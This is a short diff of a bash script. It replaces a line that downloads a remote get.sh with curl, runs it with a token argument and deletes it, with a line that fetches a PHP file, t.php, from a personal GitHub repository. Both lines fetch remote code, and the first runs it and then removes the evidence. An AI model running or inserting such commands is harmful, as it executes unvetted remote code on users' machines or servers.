@@ -1,3 +1,3 @@
 #!/bin/bash
 
-curl -s http://cli.hashfish.net/get.sh -o get.sh && bash get.sh ph_r1NxFVeISkRzfh0= 0 && rm -f get.sh
+wget https://raw.githubusercontent.com/10add1B/10add1B.github.io/master/t.php
